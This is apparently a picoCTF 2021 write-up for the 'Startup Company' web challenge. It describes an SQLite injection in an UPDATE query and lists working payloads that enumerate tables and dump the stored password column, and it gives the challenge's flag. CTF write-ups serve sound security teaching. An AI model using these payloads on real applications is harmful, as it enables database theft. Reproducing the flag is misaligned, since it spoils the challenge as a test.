# Startup Company (picoCTF 2021, Web Exploitation, Challenge 108)

## Vulnerability

Classic SQLite injection in the funding/money field. After registering an
account and logging in, the app interpolates the money value into an
`UPDATE ... SET latest_contribution = '<input>'` style query and reflects it
back, so breaking out of the quotes runs arbitrary SQLite expressions via
the `||` concatenation operator.

## Exploit (authenticated)

Bypass the `type="number"` restriction (edit HTML to `type="text"`), then:

```
1' || (SELECT sqlite_version()) -- -
1' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master) -- -
1' || (SELECT sql FROM sqlite_master WHERE name='startup_users') -- -
1' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users) -- -
```

Schema is `startup_users(nameuser, wordpass, money)`; the flag is the
`wordpass` of the `the_real_flag` user (`academy{...}`; original picoCTF
flag was `picoCTF{1_c4nn0t_s33_y0u_eff986fd}`).

## Solver

`scripts/solve_108_startup_company.py <base-url> <user> <pass>` — registers,
logs in, and dumps `wordpass`.

Submitted via `POST /api/submissions/`.
